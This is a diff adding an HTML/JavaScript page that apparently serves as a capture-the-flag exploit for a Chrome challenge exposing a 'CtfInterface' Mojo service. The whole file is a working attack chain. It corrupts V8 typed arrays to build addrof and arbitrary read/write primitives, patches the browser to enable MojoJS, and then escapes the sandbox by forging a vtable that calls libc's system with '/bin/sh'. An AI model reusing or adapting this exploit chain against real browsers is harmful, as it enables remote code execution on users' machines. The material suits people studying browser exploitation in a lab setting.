@@ -1,0 +1,209 @@
+<html>
+  <head>
+    <script src='./mojo/mojo_bindings.js'></script>
+    <script src='./mojo/third_party/blink/public/mojom/CTF/ctf_interface.mojom.js'></script>
+    <script>
+      var conversion_buffer = new ArrayBuffer(16);
+      var float_view = new Float64Array(conversion_buffer);
+      var int_view = new BigUint64Array(conversion_buffer);
+      var int32_view = new Uint32Array(conversion_buffer);
+      BigInt.prototype.hex   = function() {return '0x' + this.toString(16);};
+      BigInt.prototype.i2f   = function() {int_view[0] = this;return float_view[0];}
+      BigInt.prototype.smi2f = function() {int_view[0] = this << 32n;return float_view[0];}
+      Number.prototype.hex   = function() {return '0x' + this.toString(16);};
+      Number.prototype.f2i   = function() {float_view[0] = this;return int_view[0];}
+      Number.prototype.f2smi = function() {float_view[0] = this;return int_view[0] >> 32n;}
+      Number.prototype.fhw   = function() {float_view[0] = this;return int_view[0] >> 32n;}
+      Number.prototype.flw   = function() {float_view[0] = this;return int_view[0] & BigInt(2**32-1);}
+      Number.prototype.i2f   = function() {return BigInt(this).i2f();}
+      Number.prototype.smi2f = function() {return BigInt(this).smi2f();}
+      let print = console.log;
+
+      const k_double_array_map = 0x082430e1;
+      const k_opendir_offset = 0x00000000000df6f0n;
+
+      function gc() {
+        for (let i = 0; i < 0x10; ++i)
+          new ArrayBuffer(0x1000000);
+      }
+      class Hax extends Uint32Array {
+        constructor(len) {
+          super(len);
+          this.a = 0x12345678/2;
+        }
+      }
+      class ARW {
+        // hax[0] points to ab's backingstore
+        constructor(hax, ab, a, offset) {
+          this.hax = hax;
+          this.ab = ab;
+          this.dv = new DataView(ab);
+          this.a = a;
+          this.offset = offset;
+        }
+        set_addr(addr) {
+          if (typeof addr == 'number') {
+            this.hax[0] = addr;
+            this.hax[1] = g_v8_hd;
+          } else {
+            this.hax[0] = Number(addr & 0xffffffffn);
+            this.hax[1] = Number((addr >> 32n) & 0xffffffffn);
+          }
+        }
+        addrof(obj) {
+          this.hax.a = obj;
+          return this.a[this.offset]-1;
+        }
+        r64(addr) {
+          this.set_addr(addr);
+          return this.dv.getBigUint64(0, true);
+        }
+        r32(addr) {
+          this.set_addr(addr);
+          return this.dv.getUint32(0, true);
+        }
+        r8(addr) {
+          this.set_addr(addr);
+          return this.dv.getUint8(0, true);
+        }
+        w64(addr, val) {
+          this.set_addr(addr);
+          return this.dv.setBigUint64(0, BigInt(val), true);
+        }
+        w32(addr, val) {
+          this.set_addr(addr);
+          return this.dv.setUint32(0, val, true);
+        }
+        w8(addr, val) {
+          this.set_addr(addr);
+          return this.dv.setUint8(0, val, true);
+        }
+      }
+
+      var g_vic_ab = new ArrayBuffer(0x1000);
+      var g_v8_hd = 0;
+
+      function get_arw() {
+        let a = new Uint32Array(2);
+        let b = new Uint32Array(1);
+        let hax = new Hax(2);
+        hax[0] = 0xdeadbeef;
+        b[0] = 0x100000;
+        //b[0] = 0x100000;
+        a.set(b, 8);
+        a.set(b, 10);
+        let offset = 0;
+        for (let i = 0; i < 1000; ++i) {
+          if (a[i] == 0x12345678) {
+            offset = i;
+            print('found ' + i.hex());
+          }
+        }
+        if (!offset)
+          print('not found');
+        function addrof(obj) {
+          hax.a = obj;
+          return a[offset]-1;
+        }
+        print(addrof(hax).hex());
+        print(addrof(a).hex());
+        print(addrof(g_vic_ab).hex());
+        g_v8_hd = a[offset-7];
+        print(g_v8_hd.hex());
+
+        // hax[0] -> ab backingstore
+        // hax[1] -> ab backingstore
+        a[offset-6] = 0;
+        a[offset-7] = g_v8_hd;
+        a[offset-8] = addrof(g_vic_ab) + 28;
+
+        return new ARW(hax, g_vic_ab, a, offset);
+      }
+      async function exp() {
+        if (typeof Mojo == 'undefined') {
+          let rw = get_arw();
+          let xhr = new XMLHttpRequest();
+          let xhr_addr = rw.addrof(xhr);
+          print(xhr_addr.hex());
+          let chrome = rw.r64(xhr_addr+12) - 0xc1cef40n;
+          print(chrome.hex());
+          rw.w8(chrome+0x00000000c560f0en, 1);
+          rw.w8(chrome+0x00000000c560f0fn, 1);
+          window.location.reload();
+        }
+        await sbx();
+      }
+      async function sbx() {
+        let arr = [];
+        for (let i = 0; i < 0x100; ++i) {
+          let tmp = new blink.mojom.CtfInterfacePtr();
+          Mojo.bindInterface(blink.mojom.CtfInterface.name, mojo.makeRequest(tmp).handle, 'context', true);
+          await tmp.resizeVector(4);
+          await tmp.write((0x233000+i).i2f(), 0);
+          arr.push(tmp);
+        }
+        let ii = -1;
+        let jj = -1;
+        let chrome = 0n;
+        let heap = 0n;
+
+        for (let i = 0; i < 0x100; ++i) {
+          let aaa = (await arr[i].read(4)).value.f2i();
+          let bbb = (await arr[i].read(5)).value.f2i();
+          let ccc = (await arr[i].read(6)).value.f2i();
+          if (((aaa & 0xfffn)== 0x4e0n) && ((ccc - bbb) == 0x20n)) {
+            heap = bbb;
+            chrome = aaa - 0xbc774e0n;
+            await arr[i].write((bbb+8n).i2f(), 5);
+            ii = i;
+            break;
+          }
+        }
+        print('heap ' + heap.hex());
+        print('chrome ' + chrome.hex());
+        print('index1 ' + ii);
+        for (let i = 0; i < 0x100; ++i) {
+          let aaa = (await arr[i].read(0)).value.f2i();
+          if (aaa != 0x233000n + BigInt(i)) {
+            jj = i;
+            break;
+          }
+        }
+        print('index2 ' + jj);
+        if (ii != jj) {
+          async function read64(addr) {
+            await arr[ii].write(addr.i2f(), 5);
+            return (await arr[jj].read(0)).value.f2i();
+          }
+
+
+          // get libc
+          let opendir = await read64(chrome + 0x0000c2ce2a8n);
+          let libc = opendir - 0x00000000000df6f0n;
+          let system = libc + 0x4f550n;
+          let gadget = chrome + 0x052ac463n;
+          print('libc: ' + libc.hex());
+
+          await arr[ii].write((heap).i2f(), 5);
+          // fake vtable
+          await arr[jj].write(0x68732f6e69622fn.i2f(), 0);
+          await arr[jj].write(system.i2f(), 1);
+          await arr[jj].write(gadget.i2f(), 2);
+          // vtable
+          await arr[ii].write((heap).i2f(), 4);
+          // call
+          await arr[jj].resizeVector(0x12345);
+        } else {
+          await arr[ii].write((heap).i2f(), 4);
+          await arr[ii].write(0x414141414141.i2f(), 0);
+          await arr[ii].write((heap-0x10n).i2f(), 4);
+          await arr[ii].resizeVector(0x12345);
+        }
+      }
+      exp();
+    </script>
+  </head>
+  <body>
+    <a href="#" onclick="exp()"> test </a>
+  </body>
+</html>
